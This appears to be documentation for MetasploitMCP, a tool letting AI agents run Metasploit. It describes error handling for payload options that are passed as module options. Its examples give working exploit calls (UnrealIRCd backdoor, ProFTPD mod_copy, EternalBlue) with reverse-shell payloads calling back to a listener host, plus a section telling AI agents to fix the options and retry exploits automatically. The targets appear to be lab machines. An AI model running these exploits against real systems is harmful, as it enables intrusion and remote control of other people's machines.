# Intelligent Error Detection - Payload vs Module Options

## 🎯 Overview

MetasploitMCP now automatically detects when **payload options** (like `LHOST`, `LPORT`) are incorrectly provided as **module options**, and provides clear, actionable error messages to help you fix the configuration.

## 🔍 Problem This Solves

### The Issue

When running exploits with `run_as_job=True` (RPC mode), Metasploit is stricter about option validation than console mode. A common mistake is passing payload options like `LHOST` and `LPORT` as module options:

```python
# ❌ WRONG: Payload options in module options
await run_exploit(
    module_name='exploit/unix/irc/unreal_ircd_3281_backdoor',
    options={
        'RHOSTS': '10.0.2.15',
        'RPORT': '6697',
        'LHOST': '10.0.0.1',  # ❌ This is a PAYLOAD option, not module option!
        'LPORT': 4444         # ❌ This is a PAYLOAD option, not module option!
    },
    payload_name='cmd/unix/reverse'
)
```

### Without Intelligent Detection

You would get a **cryptic error**:
```
KeyError: "Invalid option 'LHOST'."
```

### With Intelligent Detection ✅

You now get a **helpful, detailed error**:
```
❌ CONFIGURATION ERROR: Payload options (LHOST, LPORT) cannot be set on the exploit module.

These options belong to the PAYLOAD, not the exploit module 'exploit/unix/irc/unreal_ircd_3281_backdoor'.

🔧 How to fix:
1. Move LHOST, LPORT from 'options' to 'payload_options'
2. Keep module-specific options (RHOSTS, RPORT, etc.) in 'options'

Example:
  ✗ WRONG:
    run_exploit(
        module_name='exploit/unix/irc/unreal_ircd_3281_backdoor',
        options={'RHOSTS': '...', 'LHOST': '...', 'LPORT': ...},  # ❌ LHOST/LPORT here
        payload_name='...')

  ✓ CORRECT:
    run_exploit(
        module_name='exploit/unix/irc/unreal_ircd_3281_backdoor',
        options={'RHOSTS': '...', 'RPORT': ...},  # ✅ Module options only
        payload_name='...',
        payload_options={'LHOST': '...', 'LPORT': ...})  # ✅ Payload options separate
```

## 📋 Detected Payload Options

The following options are automatically detected as payload-only options:

### Common Options
- `LHOST` - Listener host address
- `LPORT` - Listener port
- `EXITFUNC` - Exit function for payload

### Advanced Listener Options
- `ReverseListenerBindAddress` - Bind address for handler
- `ReverseListenerBindPort` - Bind port for handler
- `ReverseListenerComm` - Communication method

### Meterpreter-Specific Options
- `PrependMigrate` - Auto-migrate after exploitation
- `PrependSetuid` - Set UID before execution
- `PrependSetreuid` - Set real/effective UID
- `PrependSetresuid` - Set real/effective/saved UID
- `AutoRunScript` - Script to run automatically
- `InitialAutoRunScript` - Initial auto-run script
- `AutoSystemInfo` - Automatically gather system info
- `EnableStageEncoding` - Enable payload stage encoding
- `StageEncoder` - Encoder to use for stages
- `StageEncoderSaveRegisters` - Save registers during encoding
- `StageEncodingFallback` - Fallback for encoding

## ✅ Correct Usage Examples

### Example 1: Simple Exploit

```python
await run_exploit(
    module_name='exploit/unix/ftp/proftpd_modcopy_exec',
    options={
        'RHOSTS': '10.0.2.15',
        'RPORT': '80',
        'RPORT_FTP': '21',
        'SITEPATH': '/var/www/html/',
        'TMPPATH': '/tmp'
    },
    payload_name='cmd/unix/reverse_perl',
    payload_options={
        'LHOST': '10.0.0.1',
        'LPORT': 4444
    }
)
```

### Example 2: With Advanced Payload Options

```python
await run_exploit(
    module_name='exploit/windows/smb/ms17_010_eternalblue',
    options={
        'RHOSTS': '192.168.1.10',
        'RPORT': 445
    },
    payload_name='windows/x64/meterpreter/reverse_tcp',
    payload_options={
        'LHOST': '192.168.1.5',
        'LPORT': 4444,
        'EXITFUNC': 'thread',
        'PrependMigrate': True,
        'AutoRunScript': 'migrate -n explorer.exe'
    }
)
```

### Example 3: Using Test Harness

```python
# In metasploitable3_test_harness.py
ExploitTest(
    name="UnrealIRCd Backdoor",
    module="exploit/unix/irc/unreal_ircd_3281_backdoor",
    payload="cmd/unix/reverse",
    options={
        "RHOSTS": "10.0.2.15",
        "RPORT": "6697"
        # ✅ LHOST/LPORT are extracted automatically and passed as payload_options
    }
)
```

## 🔧 How It Works

The intelligent error detection works at the `_set_module_options()` level:

1. **Option Setting**: When setting options on an exploit module, each option is validated
2. **Error Capture**: If an "Invalid option" error occurs, the option name is checked
3. **Payload Option Detection**: If the option is in the `PAYLOAD_ONLY_OPTIONS` list, it's flagged
4. **Helpful Error**: A detailed, actionable error message is generated with examples

## 🎓 For AI Agents

When an AI agent receives this error, it should:

1. **Parse the error** to identify which options are misplaced (e.g., `LHOST`, `LPORT`)
2. **Restructure the call** by moving those options from `options` to `payload_options`
3. **Retry the exploit** with the corrected configuration

The error message is designed to be easily parseable and actionable for automated systems.

## 🧪 Testing

The feature is tested in:
- `tests/test_tools_integration.py` - Integration tests for exploit execution
- Automatically validates option placement during test execution
- No additional configuration required

## 📝 Notes

- This detection only activates when an actual error occurs (zero performance overhead for correct configs)
- The error is raised as a `ValueError` for easy catching and handling
- The feature works in both RPC mode (`run_as_job=True`) and console mode (`run_as_job=False`)
- The test harness (`metasploitable3_test_harness.py`) automatically separates payload options, so this error is less likely there

## 🔗 Related Documentation

- [Metasploitable3 Test Harness](../METASPLOITABLE3_HARNESS_README.md)
- [Port Availability Checking](PORT_AVAILABILITY_CHECK.md)
- [API Documentation](API.md)

